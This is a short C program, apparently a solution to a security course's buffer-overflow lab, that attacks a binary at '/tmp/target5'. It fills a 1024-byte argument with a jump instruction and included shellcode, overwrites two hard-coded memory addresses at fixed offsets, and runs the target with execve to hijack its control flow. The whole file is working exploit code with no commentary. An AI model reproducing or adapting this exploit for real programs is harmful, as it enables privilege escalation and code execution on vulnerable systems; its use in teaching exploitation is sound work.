#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  args[1] = malloc(1024);
  memset(args[1], 1, 1024);
  args[1][1023] = '\0';
  memcpy(args[1], "\xeb\x06", 2);
  memcpy(args[1] + 8, shellcode, strlen(shellcode));

  *(int*)(args[1] + 400) = 0x08049bc8;
  *(int*)(args[1] + 404) = 0xbffffa8c;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
